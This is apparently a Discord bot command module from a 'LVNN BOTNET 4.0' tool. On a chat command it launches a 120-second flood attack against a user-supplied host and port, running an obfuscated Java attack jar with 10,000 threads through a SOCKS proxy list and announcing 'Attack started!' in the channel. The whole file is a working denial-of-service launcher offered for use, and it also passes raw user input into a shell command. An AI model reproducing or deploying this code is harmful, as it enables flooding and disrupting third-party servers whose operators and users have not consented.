const Discord = require("discord.js");

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
const proxy = args.join(" ").slice(2)
var exec = require('child_process').exec
exec(`timeout 120 java -jar DropBotv9-beta_obf.jar host=${host} port=${port} pfile=socks_proxies.txt threads=10000 method=auth version=47 license=123ascqweq11`, (error, stdout, stderr) => {
});
console.log('An Attack Launched Discord ID:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **LVNN BOTNET 4.0** 🔥')
	.setTimestamp()
	.setDescription("**► Method: AuthSmasher2 💥** \n \n ► Attack started! ✅ \n ► for 120 seconds! 🕒 \n ☆ Flood by BlackCrack SQUAD ☆")
	.setFooter('© Developer Mareczekkkk#9738.', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['auth2'],
  permLevel: 0
}

exports.help = {
  name: 'auth2',
  description: 'Özel',
  usage: 'auth2'
}